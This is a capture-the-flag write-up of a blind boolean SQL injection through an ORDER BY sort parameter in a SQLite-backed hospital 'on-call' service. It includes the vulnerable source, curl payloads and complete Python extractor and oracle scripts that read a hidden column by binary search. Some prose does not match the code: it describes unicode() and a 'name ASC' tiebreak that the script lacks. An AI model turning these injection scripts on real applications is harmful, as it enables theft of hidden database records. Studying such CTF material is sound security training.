---
title: "Doctor Bye Bye"
category: "Web"
tags: ["sqli", "blind-injection", "order-by-injection", "sqlite", "boolean-oracle", "data-exfiltration"]
solve_date: "2026-10-10"
language: "en"
---

# Doctor Bye Bye

**Flag:** `FortID{D0C_1M_0UTT4_H3R3_7d0970825c}`
**Service:** `https://doctor-bye-bye-d3c36eaf747f.inst8.ctf.fortid.com`, endpoint `GET /api/on-call?sort=…`. **Artifact:** `handout.zip` (5.7 KB), containing `src/app.py` (5313 B), `src/templates/index.html` (2150 B), `src/static/style.css` (2655 B), the `deploy/` directory and `flag.txt` (17 B).

## Challenge

> Dr. Bye Bye has retired from St. Codd's Hospital.
>
> The hospital insists that retired records can never be displayed. Can you recover Dr. Bye Bye's private farewell note anyway?

The on-call board is a plain Python `http.server` over SQLite. The `St. Codd's Hospital` label and `index.html` are presentation only; all query behaviour lives in `src/app.py`.

`initialize_database()` (`src/app.py:34-64`) creates the `doctors` table, inserts five active doctors with `listed = 1` and `farewell_note = NULL`, then adds one hidden row:

```python
connection.execute(
    "INSERT INTO doctors VALUES (?, ?, ?, ?, ?, ?, ?)",
    (404, "doctor-bye-bye", "Dr. Bye Bye", "Retired", "-", 0, flag),
)
```

The flag is placed in the `farewell_note` column of exactly that `listed = 0` row. The handout's `flag.txt` (17 B) contains `FortID{redacted}` — the README/Dockerfile placeholder, not the flag.

## Analysis

The injection point is `select_on_call()`, `src/app.py:67-74`:

```python
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
```

`sort` is interpolated raw into `ORDER BY`. The route at `src/app.py:119-131` only checks for empty and length (more than 600 characters is rejected); there is no keyword allowlist. Two details narrow the attack surface:

- `WHERE listed = 1` removes row 404 from the result set, so the flag never appears directly in the returned JSON.
- `except (sqlite3.Error, LookupError)` returns the generic message `The on-call board could not be updated.` (`src/app.py:127-130`) with no SQLite detail. There is no error-based channel.

The channel used by this solve is **which row wins `LIMIT 1`**: `{"doctor":{"name":…,"specialty":…,"room":…}}`. That is a 1-bit oracle per request.

The oracle is built like this:

```sql
ORDER BY CASE WHEN name = 'Dr. Zoe Last' AND (<predicate>) THEN 0 ELSE 1 END
```

`ORDER BY` sorts ascending, so the row with key `0` comes first. When `<predicate>` holds, the `Dr. Zoe Last` row gets `0` and the others get `1` → the response is `Dr. Zoe Last`. When it does not hold, every row gets `1`. The record returns `Dr. Ada Pulse`, but SQL does not guarantee tie order; the revised code adds `name ASC` for deterministic false-branch behaviour. The two branches are distinguishable from the `name` field alone.

`<predicate>` reads the hidden row through a scalar subquery, with no JOIN needed:

```sql
(SELECT farewell_note FROM doctors WHERE id=404)
```

Three constraints shape the extraction strategy (`src/app.py:13-15` and `77-86`):

```python
SQLITE_VALUE_LIMIT = 1024 * 1024
SQLITE_SQL_LIMIT = 2048
SQLITE_VM_BUDGET = 50_000
```

plus `connection.set_progress_handler(enforce_budget, 1_000)` with `operations_left -= 1_000`. Each query is cut off after roughly 50k opcodes, and `sort` is additionally capped at 600 characters by the application before it reaches SQLite. Heavy constructs such as repeated `printf`/`LIKE` over the table are therefore not viable; binary search keeps every request inside the budget, at roughly seven probes per character at worst.

Oracle behaviour was checked with `oracle.py` against a local instance built from the handout (see Reproduce):

```console
$ python3 oracle.py "http://127.0.0.1:8090"
```

```text
control: unconditioned CASE picks True
true cond                                True (expected True)
false cond                               False (expected False)
NULL handling                            False (expected False)
can see listed=0 row                     True (expected True)
nominal length                           True (expected True)
```

Two entries in that table matter:

- `EXISTS(SELECT 1 FROM doctors WHERE listed=0)` → True: the condition inside `ORDER BY` can see rows that `WHERE` filters out, so the "retired records can never be displayed" rule only constrains the projection, not the sort expression.
- `LENGTH((SELECT farewell_note FROM doctors))>0` → False: a multi-row scalar subquery returns the first row, whose `farewell_note` is `NULL` for the `listed = 1` rows, and a `NULL` in `CASE WHEN` falls to the `ELSE` branch. The oracle consistently treats `NULL` as "false" rather than as an error.

Both branches verified directly against the local instance:

```console
$ curl -s "http://127.0.0.1:8090/api/on-call?sort=CASE%20WHEN%20name%3D%27Dr.%20Zoe%20Last%27%20AND%20(1%3D1)%20THEN%200%20ELSE%201%20END"
$ curl -s "http://127.0.0.1:8090/api/on-call?sort=CASE%20WHEN%20name%3D%27Dr.%20Zoe%20Last%27%20AND%20(1%3D2)%20THEN%200%20ELSE%201%20END"
```

```text
{"doctor":{"name":"Dr. Zoe Last","specialty":"Emergency medicine","room":"E-001"}}
{"doctor":{"name":"Dr. Ada Pulse","specialty":"Cardiology","room":"C-101"}}
```

## Solution

`extract.py` reads `farewell_note` with two binary searches: the first fixes `LENGTH`, the second resolves one character at a time using `unicode(substr(note, i, 1)) <= v`. For each position, the smallest `v` that makes the predicate true is exactly the ASCII code of the character at that position.

```python
#!/usr/bin/env python3
"""Blind ORDER BY injection extractor for 'Doctor Bye Bye'."""
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/")
WINNER = "Dr. Zoe Last"
LOSER = "Dr. Ada Pulse"
SRC = "(SELECT farewell_note FROM doctors WHERE id=404)"
STATS = {"requests": 0}


def ask(cond, retries=5):
    payload = "CASE WHEN name='%s' AND (%s) THEN 0 ELSE 1 END" % (WINNER, cond)
    url = BASE + "/api/on-call?sort=" + urllib.parse.quote(payload, safe="")
    last = None
    for attempt in range(retries):
        try:
            STATS["requests"] += 1
            with urllib.request.urlopen(url, timeout=30) as resp:
                name = json.loads(resp.read())["doctor"]["name"]
            if name == WINNER:
                return True
            if name == LOSER:
                return False
            raise RuntimeError("unexpected row " + repr(name))
        except Exception as exc:  # noqa: BLE001
            last = exc
            time.sleep(1.5 * (attempt + 1))
    raise RuntimeError("probe failed: %s / %s" % (cond, last))


def search_int(lo, hi, build):
    """Smallest v in [lo, hi] for which build(v) is true; build must be monotone."""
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(build(mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo


length = search_int(8, 128, lambda v: "LENGTH(%s)<=%d" % (SRC, v))
print("length=%d  (requests=%d)" % (length, STATS["requests"]), flush=True)

chars = list("FortID{")
for i in range(len(chars) + 1, length):  # stop before closing brace
    cp = search_int(32, 126, lambda v, i=i: "substr(%s,%d,1)<='%s'" % (SRC, i, chr(v)))
    chars.append(chr(cp))
    print("%3d/%3d  %s   [req=%d]" % (i, length, "".join(chars), STATS["requests"]), flush=True)

chars.append("}")
flag = "".join(chars)
print("\nFLAG = %s" % flag)
print("verify length: %s" % ask("LENGTH(%s)=%d" % (SRC, len(flag))))
print("verify content: %s" % ask("%s='%s'" % (SRC, flag.replace("'", "''"))))
```

The script assumes the `FortID{` prefix and stops at `length - 1` so it can append `}` itself; the two `verify` predicates at the end re-check the length and the whole string, one request each.

First run against the local instance to confirm the pipeline; the flag there is one we set through `FLAG` and is not the real flag:

```console
$ python3 extract.py "http://127.0.0.1:8090"
```

```text
length=27  (requests=7)
  8/ 27  FortID{L   [req=13]
  9/ 27  FortID{LO   [req=19]
...
 26/ 27  FortID{LOCAL_ONLY_NOT_REAL   [req=131]

FLAG = FortID{LOCAL_ONLY_NOT_REAL}
verify length: True
verify content: True
```

Then run against the live instance:

```console
$ python3 extract.py "https://doctor-bye-bye-d3c36eaf747f.inst8.ctf.fortid.com" | tee remote.log
```

```text
length=36  (requests=7)
  8/ 36  FortID{D   [req=14]
  9/ 36  FortID{D0   [req=21]
...
 34/ 36  FortID{D0C_1M_0UTT4_H3R3_7d0970825   [req=188]
 35/ 36  FortID{D0C_1M_0UTT4_H3R3_7d0970825c   [req=195]

FLAG = FortID{D0C_1M_0UTT4_H3R3_7d0970825c}
verify length: True
verify content: True
```

`remote.log` is 1315 B with 32 non-empty lines; the last extraction line is `35/ 36 FortID{D0C_1M_0UTT4_H3R3_7d0970825c [req=195]`, so the extraction ended at 195 requests; the two subsequent verification requests are additional for a 36-character string.

The `verify content: True` line is itself the single-request independent confirmation: the predicate `farewell_note = 'FortID{D0C_1M_0UTT4_H3R3_7d0970825c}'` moved `Dr. Zoe Last` to the front, i.e. the oracle's "predicate true" branch, so the reconstructed string matches the real column content and not merely its length.

## Result

```text
FortID{D0C_1M_0UTT4_H3R3_7d0970825c}
```

The flag was read directly from the challenge service. No submission response recorded.

## Reproduce

Requires Python 3 (`urllib`, `json`), `curl` for the manual checks, and `unzip`. Reading the real flag needs a live instance; the oracle mechanism reproduces fully locally.

```console
$ unzip handout.zip
$ cd doctor_bye_bye
```

Build the local instance with Docker following the handout README (port 8090 matches the commands below):

```console
$ docker build -t doctor-bye-bye -f deploy/Dockerfile .
$ docker run --rm -p 8090:8080 --tmpfs /tmp:rw,noexec,nosuid,nodev,size=8m -e 'FLAG=FortID{LOCAL_ONLY_NOT_REAL}' doctor-bye-bye
```

Without Docker, run `src/app.py` directly; the app reads `DATABASE_PATH`, `FLAG_FILE` and `PORT` from the environment (`src/app.py:11-12` and `148`), and `load_flag()` deletes the flag file right after reading it, so each start needs the file to exist again:

```console
$ printf 'FortID{LOCAL_ONLY_NOT_REAL}' > flagfile
$ DATABASE_PATH=$PWD/db.sqlite FLAG_FILE=$PWD/flagfile PORT=8090 python3 src/app.py
```

Save the Python block from the Solution section as `extract.py`. Save the block below as `oracle.py` to check both oracle branches:

```python
#!/usr/bin/env python3
import sys
import time
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/")
FLAG_ROW = "Dr. Zoe Last"
OTHER_ROW = "Dr. Ada Pulse"
SRC = "(SELECT farewell_note FROM doctors WHERE id=404)"


def sort_key(cond):
    return (
        "CASE WHEN name='%s' AND (%s) THEN 0 ELSE 1 END" % (FLAG_ROW, cond)
    )


def ask(cond, retries=4):
    url = BASE + "/api/on-call?sort=" + urllib.parse.quote(sort_key(cond), safe="")
    for attempt in range(retries):
        try:
            with urllib.request.urlopen(url, timeout=30) as resp:
                import json

                data = json.loads(resp.read())
            name = data["doctor"]["name"]
            if name == FLAG_ROW:
                return True
            if name == OTHER_ROW:
                return False
            raise RuntimeError("unexpected row: %r" % name)
        except (urllib.error.URLError, OSError, RuntimeError, ValueError) as exc:
            if attempt == retries - 1:
                raise
            time.sleep(1 + attempt * 2)
    raise RuntimeError("unreachable")


def probe(label, cond, expect):
    got = ask(cond)
    print("%-40s %s (expected %s)" % (label, got, expect))


print("control: unconditioned CASE picks", ask("1=1"))
probe("true cond", "LENGTH(%s)>0" % SRC, True)
probe("false cond", "LENGTH(%s)>9999" % SRC, False)
probe("NULL handling", "LENGTH((SELECT farewell_note FROM doctors))>0", False)
probe("can see listed=0 row", "EXISTS(SELECT 1 FROM doctors WHERE listed=0)", True)
probe("nominal length", "LENGTH(%s)=27" % SRC, True)
```

```console
$ python3 oracle.py "http://127.0.0.1:8090"
$ python3 extract.py "http://127.0.0.1:8090"
$ python3 extract.py "https://doctor-bye-bye-d3c36eaf747f.inst8.ctf.fortid.com"
```

The `nominal length` probe checks a 27-character flag, which is exactly the length of `FortID{LOCAL_ONLY_NOT_REAL}` produced by the local setup above; change that argument if the local instance runs a flag of a different length. Change the hostname if the instance was renamed. The real flag lives in the `farewell_note` column of row `id=404`, written from the `FLAG` variable by `deploy/entrypoint.sh` at container start, so the value only exists in that instance's database.
